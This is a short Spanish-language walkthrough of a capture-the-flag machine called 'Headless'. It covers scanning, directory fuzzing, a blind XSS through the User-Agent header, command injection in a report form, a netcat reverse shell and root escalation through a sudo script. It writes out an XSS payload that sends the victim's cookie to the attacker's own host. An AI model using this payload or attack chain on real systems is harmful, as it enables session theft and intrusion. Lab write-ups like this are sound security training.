Headless

Al hacer el escaneo inicial podemos ver que los puertos 5000 y el puerto 22 están abiertos. En el puerto 5000 corre http, podemos ver una página web la cual tiene una cuenta regresiva, si accedemos a la pestaña de soporte podemos ver un formulario.

Si hacemos un poco de fuzzing con gobuster podemos ver que existe una dirección /dashboard con el código de status 500 lo cual esto nos puede llevar a pensar en un XSS.

Si tratamos de inyectar código js en el formulario vemos lo siguiente:

Lo interesante de esto es que podemos ver el User-Agent por lo que puede ser que podamos inyectar comandos en él.

Lo interceptamos en burpsuite y vemos como responde. En el campo User-Agent inyectamos el siguiente código: <script>document.location="http://mi.ip/?cookie="documnet.cookie;</script> y levantamos un servidor http propio y recibimos la cookie.

Nos vamos a la dirección /dashboard e introducimos nuestra cookie en el storage de la web y vemos lo siguiente:

Vamos a mandar esta petición de generar report a burpsuite, para ver como funciona. En burpsuite vemos que esta fecha se genera de manera dinámica, por lo que puede ser susceptible a inyecciones.

Vamos a probar con el comando id a ver si vemos algo distinto:

Tenemos inyección de comandos. Tras probar con un montón de comandos para reverse shell, funciona la inyección con netcat.

Una vez hecho el tratamiento vemos que es lo que hay. Vemos que tenemos permisos de ejecutar un script en bash como root. Cuando vemos el script podemos observar que llama a un script , por lo tanto , modificamos el script para que nos mande root una reverse shell de manera privilegiada y ya somos root.
